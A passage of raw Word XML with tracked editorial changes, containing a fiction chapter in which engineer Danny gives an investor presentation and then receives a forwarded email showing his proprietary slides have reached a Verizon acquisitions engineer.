          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="444488"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>I gave a great performance. They should be whistling and howling and throwing their underwear at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around and decided it</w:t>
      </w:r>
      <w:del w:id="152" w:author="TextVet" w:date="2016-03-14T18:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008E3192">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>’s</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> best </w:t>
      </w:r>
      <w:ins w:id="153" w:author="TextVet" w:date="2016-03-14T18:06:00Z">
        <w:r w:rsidR="008E3192">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>that</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="154" w:author="TextVet" w:date="2016-03-14T18:06:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008E3192">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>if</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> they didn’t.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smattering of polite, professional applause came from two dozen 50-something men. In place of tattoos and piercings were hair plugs and dental veneers. What should have been a stadium glittering with cellphone flashes was instead a bland conference room awash in the sickly light of fluorescent bulbs. Half of the audience were wearing gray suits, like Danny. The rest were in khakis and polos, doubtlessly planning to get back to their sailboats or golf courses after the meeting.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One attendee actually </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>was</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> wearing a concert T-shirt under his suit jacket — a </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Nine Inch Nails World Tour</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> XL tucked into pleated pants, spread over a belly that had apparently gone decades without being subjected to a sit-up. The thinning remnants of his salt-and-pepper hair were gelled upward into what would’ve been a fashionable fauxhawk on a man half his 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no microphone in Danny’s hand, only a laser pointer. No spotlight, only a high-resolution projector. No hit rock song, only a PowerPoint presentation describing a 4G cellular multiplexing algorithm by Claymore Communications.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Danny’s boss, Brent Thurston, stepped deftly forward. “That’ll conclude the technical portion of this meeting. And folks, I just want to say before we move on, that </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Danny and I really appreciate this opportunity to present this work to you. It’s great to see Claymore’s financial contributors showing a genuine interest in the engineering efforts of the company.”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“Oh, our pleasure!” said the man in the Nine Inch Nails T-shirt. “Danny’s presentation was amazing, but what’s even more exciting </w:t>
      </w:r>
      <w:ins w:id="155" w:author="TextVet" w:date="2016-03-14T18:09:00Z">
        <w:r w:rsidR="004F41AD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">is </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>his technology. What you’ve shown here is an upcoming wireless revolution, and I’m proud to help it come to fruition!” Later that day, NIN Man would buy Claymore Communications with his personal funds, and the company would go public. Danny would cash in his stock options to buy a downtown penthouse, and spend the next several years building Claymore into the world’s premier data systems provider. He would be featured in </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Time</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> magazine as the face of digital communication in the 21</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
          <w:vertAlign w:val="superscript"/>
        </w:rPr>
        <w:t>st</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> century.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Only, that never actually happened, either.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Instead, the man in the Nine Inch Nails shirt said cheerfully, “We’re glad you set up this meeting for us! Your man Danny here really knows his stuff.”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Brent beamed. “Yes, Danny’s been a great asset to the company. He’s been Claymore’s lead engineer for… How long, Danny? Five years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“Six,” Danny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ran the Naval Base Kitsap project last year,” Brent continued. “He’s personally responsible for the firmware designs you guys saw here tonight. And you should see him bust a move on </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Dance Dance Revolution</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>!” The investors laughed on cue.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“Would it be possible,” NIN man asked, “for Danny’s slides to be available after we finish?”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answered on his own behalf. “Sure thing. I can put this up on the Claymore website right now…” His hand moved inside his jacket toward his cellphone.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room erupted in murmurs of protest and clearing of throats. The one-percenters exchanged nervous glances and inched forward in their seats. Danny stood frozen with his hand halfway to his chest pocket</w:t>
      </w:r>
      <w:del w:id="156" w:author="TextVet" w:date="2016-03-14T18:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DC6C27">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as though </w:t>
      </w:r>
      <w:del w:id="157" w:author="TextVet" w:date="2016-03-14T18:11:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DC6C27">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">he was </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>caught drawing a gun. He blinked dumbly at Brent for help.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Brent returned Danny’s look with an embarrassed half-smile. “The company’s website is maybe not the best place for proprietary technical data, Danny.” To the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>investors, he said</w:t>
      </w:r>
      <w:ins w:id="158" w:author="TextVet" w:date="2016-03-14T18:12:00Z">
        <w:r w:rsidR="00571A9F">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="159" w:author="TextVet" w:date="2016-03-14T18:12:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00412548">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“But we’ll be delighted to email this presentation to each of you as soon as we wrap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“Please make sure I get a personal copy,” NIN man insisted. “You can reach me at Jason Tuttle at AOL dot com. That’s J, A, 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Brent </w:t>
      </w:r>
      <w:ins w:id="160" w:author="TextVet" w:date="2016-03-14T18:12:00Z">
        <w:r w:rsidR="00CA250D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>assuaged</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="161" w:author="TextVet" w:date="2016-03-14T18:12:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CA250D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>quieted</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> him </w:t>
      </w:r>
      <w:del w:id="162" w:author="TextVet" w:date="2016-03-14T18:12:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CA250D">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">down </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">with a </w:t>
      </w:r>
      <w:del w:id="163" w:author="TextVet" w:date="2016-03-14T18:13:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A25E91">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">reassuring </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>handwave. “You’ll get one, Jason. You’ll all get one. And I’ll send out Danny’s contact info for further technical questions.”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just like that, Brent Thurston took the room. He launched his own set of PowerPoint slides, discussing things like potential partnership strategies and market penetration projections. Danny stood aside to let the big boys play.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some alternate universe Danny would have gotten an MBA after finishing his master’s degree. He’d have moved to New York and quickly climbed the ladder at a multinational holding company, eventually starting a tech-heavy hedge fund. He’d date models, dine at fine restaurants, and light cigars with burning hundred-dollar bills. By night he’d don a cape and cowl and prowl the rooftops fighting crime.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the real world, during his last trip to New York he’d dropped his cellphone onto a set of subway tracks. In reality, New York sucked.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Reality sucked.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“Reality sucks.”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i/>
          <w:iCs/>
          <w:color w:val="444488"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Crap! I didn't say that out loud, did I?</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words had escaped under his breath. All eyes turned to Danny. Brent’s jaw </w:t>
      </w:r>
      <w:ins w:id="164" w:author="TextVet" w:date="2016-03-14T18:14:00Z">
        <w:r w:rsidR="00DF05EC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>caverned</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="165" w:author="TextVet" w:date="2016-03-14T18:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DF05EC">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>hung</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> open.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Sorry,” Danny said. “I was just… My mind was somewhere else.”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Brent stepped in diplomatically. “Danny’s been working hard to put this slideshow together for you guys. He stayed up late last night giving it a final polish. He could probably use some coffee. Right,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took the hint. As he fled the room, he heard Brent resume the presentation.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i/>
          <w:iCs/>
          <w:color w:val="444488"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Reality sucks?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i/>
          <w:iCs/>
          <w:color w:val="444488"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>No. I suck.</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lastRenderedPageBreak/>
        <w:t>The coffee pot in the company kitchen</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> held Danny in rapt attention. It glowed with a shade of red slightly deeper than the visible spectrum: infrared. Every object in the universe emitted black-body radiation based on its temperature. Danny mentally computed the hot coffee pot’s emission spectrum, a relatively easy task using Planck’s Law: the power per unit area </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> of frequency </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> from a body at temperature </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> was equal to </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> cubed times…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vibration on his chest broke his trance. His cellphone signaled an incoming email. Judging by the time, Brent’s Q&amp;A had </w:t>
      </w:r>
      <w:ins w:id="166" w:author="TextVet" w:date="2016-03-14T18:15:00Z">
        <w:r w:rsidR="000D6C48">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ended</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="167" w:author="TextVet" w:date="2016-03-14T18:15:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="000D6C48">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>come to a close</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> several minutes ago. The investors had probably cleared out </w:t>
      </w:r>
      <w:del w:id="168" w:author="TextVet" w:date="2016-03-14T18:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003B4471">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">by now </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>and were already driving their Beamers and Lexi home.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>From: Jason Tuttle &lt;jason.tuttle@aol.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>CC: Dorothy Eigen &lt;eigend@corp.verizon.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: FW: RE: Claymore Communications intellectual property auction</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>(1 Attachment)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i/>
          <w:iCs/>
          <w:color w:val="444488"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>NIN Man?</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> thought Danny. </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="444488"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The guy doesn’t waste any time…</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> He expanded the message.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="000D3488" w:rsidP="00C824A8">
      <w:pPr>
        <w:pStyle w:val="Email"/>
      </w:pPr>
      <w:r w:rsidRPr="000D3488">
        <w:t>Danny, could you answer Dorothy's question?</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Jason</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>---</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>From: Dorothy Eigen &lt;eigend@corp.verizon.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>To: Jason Tuttle &lt;jason.tuttle@aol.com&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Subject: RE: Claymore Communications intellectual property auction</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>(1 Attachment) </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Thanks for sending this, Jason. I'll study it tomorrow. One question, though. On slides 7 through 12, the diagrams show elliptical polarization, but they use different eccentricities. Is that intentional?</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Dorothy Eigen</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Senior Feasibility Engineer</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Department of Mergers &amp; Acquisitions</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:br/>
        <w:t>Verizon Communications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email continued with a chain of forwards and replies by random corporate people. The attachment was the PowerPoint presentation that Danny had delivered less than half an hour ago.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Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Sure</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,” Danny typed in reply. “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="004400"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Put simply, the phase angle deltas are part of the encoding scheme. To solve the obvious physical reception problems, we’ve developed a polyradial antenna</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His fingers </w:t>
      </w:r>
      <w:del w:id="169" w:author="TextVet" w:date="2016-03-15T11:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F96840">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">abruptly </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>froze</w:t>
      </w:r>
      <w:ins w:id="170" w:author="TextVet" w:date="2016-03-15T11:52:00Z">
        <w:r w:rsidR="00F96840">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, hovering above a surge of doubt</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:ins w:id="171" w:author="TextVet" w:date="2016-03-15T11:52:00Z">
        <w:r w:rsidR="00F96840">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">Buffeting, then almost eclipsing NIN Man’s request, it flared into a conundrum. Yes, the email thread ranged up and down as dynamic, self-calibrating quadrature amplitude modulation protocols </w:t>
        </w:r>
